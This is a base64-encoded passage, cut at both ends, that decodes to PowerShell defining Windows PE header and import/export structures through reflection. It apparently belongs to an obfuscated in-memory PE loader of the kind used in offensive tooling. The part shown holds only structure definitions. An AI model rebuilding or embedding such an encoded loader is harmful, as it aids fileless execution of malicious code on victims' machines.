0T2Zmc2V0KDQ2KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFqb3JTdWJzeXN0ZW1WZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQ4KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWlub3JTdWJzeXN0ZW1WZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDUwKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnV2luMzJWZXJzaW9uVmFsdWUnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNTIpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZJbWFnZScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg1NikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkhlYWRlcnMnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNjApIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdDaGVja1N1bScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg2NCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1N1YnN5c3RlbScsICRTdWJTeXN0ZW1UeXBlLCAnUHVibGljJykpLlNldE9mZnNldCg2OCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0RsbENoYXJhY3RlcmlzdGljcycsICREbGxDaGFyYWN0ZXJpc3RpY3NUeXBlLCAnUHVibGljJykpLlNldE9mZnNldCg3MCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZlN0YWNrUmVzZXJ2ZScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg3MikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZlN0YWNrQ29tbWl0JywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDc2KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mSGVhcFJlc2VydmUnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoODApIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZIZWFwQ29tbWl0JywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDg0KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTG9hZGVyRmxhZ3MnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoODgpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdOdW1iZXJPZlJ2YUFuZFNpemVzJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDkyKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRXhwb3J0VGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDk2KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnSW1wb3J0VGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDEwNCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1Jlc291cmNlVGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDExMikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0V4Y2VwdGlvblRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxMjApIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdDZXJ0aWZpY2F0ZVRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxMjgpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdCYXNlUmVsb2NhdGlvblRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxMzYpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdEZWJ1ZycsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTQ0KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQXJjaGl0ZWN0dXJlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxNTIpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdHbG9iYWxQdHInLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE2MCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1RMU1RhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxNjgpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdMb2FkQ29uZmlnVGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE3NikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0JvdW5kSW1wb3J0JywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxODQpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdJQVQnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE5MikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0RlbGF5SW1wb3J0RGVzY3JpcHRvcicsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjAwKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQ0xSUnVudGltZUhlYWRlcicsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjA4KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnUmVzZXJ2ZWQnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIxNikgfCBPdXQtTnVsbAogICAgICAgICRJTUFHRV9PUFRJT05BTF9IRUFERVIzMiA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgICAgICAkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX09QVElPTkFMX0hFQURFUjMyIC1WYWx1ZSAkSU1BR0VfT1BUSU9OQUxfSEVBREVSMzIKCiAgICAgICAgI1N0cnVjdCBJTUFHRV9OVF9IRUFERVJTNjQKICAgICAgICAkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0lNQUdFX05UX0hFQURFUlM2NCcsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDI2NCkKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpZ25hdHVyZScsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRmlsZUhlYWRlcicsICRJTUFHRV9GSUxFX0hFQURFUiwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ09wdGlvbmFsSGVhZGVyJywgJElNQUdFX09QVElPTkFMX0hFQURFUjY0LCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRJTUFHRV9OVF9IRUFERVJTNjQgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCiAgICAgICAgJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9OVF9IRUFERVJTNjQgLVZhbHVlICRJTUFHRV9OVF9IRUFERVJTNjQKICAgICAgICAKICAgICAgICAjU3RydWN0IElNQUdFX05UX0hFQURFUlMzMgogICAgICAgICRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfTlRfSEVBREVSUzMyJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgMjQ4KQogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2lnbmF0dXJlJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdGaWxlSGVhZGVyJywgJElNQUdFX0ZJTEVfSEVBREVSLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnT3B0aW9uYWxIZWFkZXInLCAkSU1BR0VfT1BUSU9OQUxfSEVBREVSMzIsICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJElNQUdFX05UX0hFQURFUlMzMiA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgICAgICAkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX05UX0hFQURFUlMzMiAtVmFsdWUgJElNQUdFX05UX0hFQURFUlMzMgoKICAgICAgICAjU3RydWN0IElNQUdFX0RPU19IRUFERVIKICAgICAgICAkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0lNQUdFX0RPU19IRUFERVInLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCA2NCkKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfbWFnaWMnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfY2JscCcsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9jcCcsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9jcmxjJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX2NwYXJoZHInLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfbWluYWxsb2MnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfbWF4YWxsb2MnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2Vfc3MnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2Vfc3AnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfY3N1bScsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9pcCcsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9jcycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9sZmFybGMnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2Vfb3ZubycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoKICAgICAgICAkZV9yZXNGaWVsZCA9ICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9yZXMnLCBbVUludDE2W11dLCAnUHVibGljLCBIYXNGaWVsZE1hcnNoYWwnKQogICAgICAgICRDb25zdHJ1Y3RvclZhbHVlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5Vbm1hbmFnZWRUeXBlXTo6QnlWYWxBcnJheQogICAgICAgICRGaWVsZEFycmF5ID0gQChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxBc0F0dHJpYnV0ZV0uR2V0RmllbGQoJ1NpemVDb25zdCcpKQogICAgICAgICRBdHRyaWJCdWlsZGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkN1c3RvbUF0dHJpYnV0ZUJ1aWxkZXIoJENvbnN0cnVjdG9ySW5mbywgJENvbnN0cnVjdG9yVmFsdWUsICRGaWVsZEFycmF5LCBAKFtJbnQzMl0gNCkpCiAgICAgICAgJGVfcmVzRmllbGQuU2V0Q3VzdG9tQXR0cmlidXRlKCRBdHRyaWJCdWlsZGVyKQoKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2Vfb2VtaWQnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2Vfb2VtaW5mbycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoKICAgICAgICAkZV9yZXMyRmllbGQgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfcmVzMicsIFtVSW50MTZbXV0sICdQdWJsaWMsIEhhc0ZpZWxkTWFyc2hhbCcpCiAgICAgICAgJENvbnN0cnVjdG9yVmFsdWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLlVubWFuYWdlZFR5cGVdOjpCeVZhbEFycmF5CiAgICAgICAgJEF0dHJpYkJ1aWxkZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQ3VzdG9tQXR0cmlidXRlQnVpbGRlcigkQ29uc3RydWN0b3JJbmZvLCAkQ29uc3RydWN0b3JWYWx1ZSwgJEZpZWxkQXJyYXksIEAoW0ludDMyXSAxMCkpCiAgICAgICAgJGVfcmVzMkZpZWxkLlNldEN1c3RvbUF0dHJpYnV0ZSgkQXR0cmliQnVpbGRlcikKCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX2xmYW5ldycsIFtJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJElNQUdFX0RPU19IRUFERVIgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpICAgCiAgICAgICAgJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9ET1NfSEVBREVSIC1WYWx1ZSAkSU1BR0VfRE9TX0hFQURFUgoKICAgICAgICAjU3RydWN0IElNQUdFX1NFQ1RJT05fSEVBREVSCiAgICAgICAgJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKICAgICAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdJTUFHRV9TRUNUSU9OX0hFQURFUicsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDQwKQoKICAgICAgICAkbmFtZUZpZWxkID0gJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdOYW1lJywgW0NoYXJbXV0sICdQdWJsaWMsIEhhc0ZpZWxkTWFyc2hhbCcpCiAgICAgICAgJENvbnN0cnVjdG9yVmFsdWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLlVubWFuYWdlZFR5cGVdOjpCeVZhbEFycmF5CiAgICAgICAgJEF0dHJpYkJ1aWxkZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQ3VzdG9tQXR0cmlidXRlQnVpbGRlcigkQ29uc3RydWN0b3JJbmZvLCAkQ29uc3RydWN0b3JWYWx1ZSwgJEZpZWxkQXJyYXksIEAoW0ludDMyXSA4KSkKICAgICAgICAkbmFtZUZpZWxkLlNldEN1c3RvbUF0dHJpYnV0ZSgkQXR0cmliQnVpbGRlcikKCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdWaXJ0dWFsU2l6ZScsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVmlydHVhbEFkZHJlc3MnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZlJhd0RhdGEnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1BvaW50ZXJUb1Jhd0RhdGEnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1BvaW50ZXJUb1JlbG9jYXRpb25zJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdQb2ludGVyVG9MaW5lbnVtYmVycycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTnVtYmVyT2ZSZWxvY2F0aW9ucycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTnVtYmVyT2ZMaW5lbnVtYmVycycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQ2hhcmFjdGVyaXN0aWNzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJElNQUdFX1NFQ1RJT05fSEVBREVSID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQogICAgICAgICRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfU0VDVElPTl9IRUFERVIgLVZhbHVlICRJTUFHRV9TRUNUSU9OX0hFQURFUgoKICAgICAgICAjU3RydWN0IElNQUdFX0JBU0VfUkVMT0NBVElPTgogICAgICAgICRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfQkFTRV9SRUxPQ0FUSU9OJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgOCkKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1ZpcnR1YWxBZGRyZXNzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZCbG9jaycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRJTUFHRV9CQVNFX1JFTE9DQVRJT04gPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCiAgICAgICAgJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9CQVNFX1JFTE9DQVRJT04gLVZhbHVlICRJTUFHRV9CQVNFX1JFTE9DQVRJT04KCiAgICAgICAgI1N0cnVjdCBJTUFHRV9JTVBPUlRfREVTQ1JJUFRPUgogICAgICAgICRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1InLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCAyMCkKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0NoYXJhY3RlcmlzdGljcycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVGltZURhdGVTdGFtcCcsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRm9yd2FyZGVyQ2hhaW4nLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ05hbWUnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ZpcnN0VGh1bmsnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1IgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCiAgICAgICAgJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9JTVBPUlRfREVTQ1JJUFRPUiAtVmFsdWUgJElNQUdFX0lNUE9SVF9ERVNDUklQVE9SCgogICAgICAgICNTdHJ1Y3QgSU1BR0VfRVhQT1JUX0RJUkVDVE9SWQogICAgICAgICRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfRVhQT1JUX0RJUkVDVE9SWScsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDQwKQogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQ2hhcmFjdGVyaXN0aWNzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdUaW1lRGF0ZVN0YW1wJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWpvclZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01pbm9yVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTmFtZScsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQmFzZScsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTnVtYmVyT2ZGdW5jdGlvbnMnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ051bWJlck9mTmFtZXMnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0FkZHJlc3NPZkZ1bmN0aW9ucycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQWRkcmVzc09mTmFtZXMnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0FkZHJlc3NPZk5hbWVPcmRpbmFscycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRJTUFHRV9FWFBPUlRfRElSRUNUT1JZID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQogICAgICAgICRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfRVhQT1JUX0RJUkVDVE9SWSAtVmFsdWUgJElNQUdFX0VYUE9SVF9ESVJFQ1RPUlkKICAgICAgICAKICAgICAgICAjU3RydWN0IExVSUQKICAgICAgICAkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0xVSUQnLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCA4KQogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTG93UGFydCcsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnSGlna